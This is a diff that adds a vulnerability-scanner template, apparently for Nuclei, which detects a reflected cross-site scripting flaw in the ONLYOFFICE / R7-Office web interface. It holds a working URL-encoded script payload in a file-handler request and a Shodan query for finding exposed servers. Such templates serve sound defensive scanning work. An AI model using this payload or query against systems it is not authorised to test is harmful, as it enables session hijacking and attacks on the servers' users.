@@ -1,0 +1,39 @@
+id: r7-xss
+
+info:
+  name: ONLYOFFICE / Р7-Офис v12.5.2 - Cross-Site Scripting
+  author: haones
+  severity: high
+  description: |
+    ONLYOFFICE / R7-Office is an enterprise office server. Versions prior to 12.5.2 are subject to a reflected cross-site scripting (XSS) Attack. The vulnerability in the application's web interface could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link.
+  remediation: Upgrade to the latest version to mitigate this vulnerability.
+  reference:
+    - BDU:2023-00142 (temp)
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: title:"Р7-Офис"
+  tags: ONLYOFFICE,Р7-Офис,xss
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Can not convert id: '
+          - '<script>alert(document.domain)</script>'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'text/html'
+
+      - type: status
+        status:
+          - 500
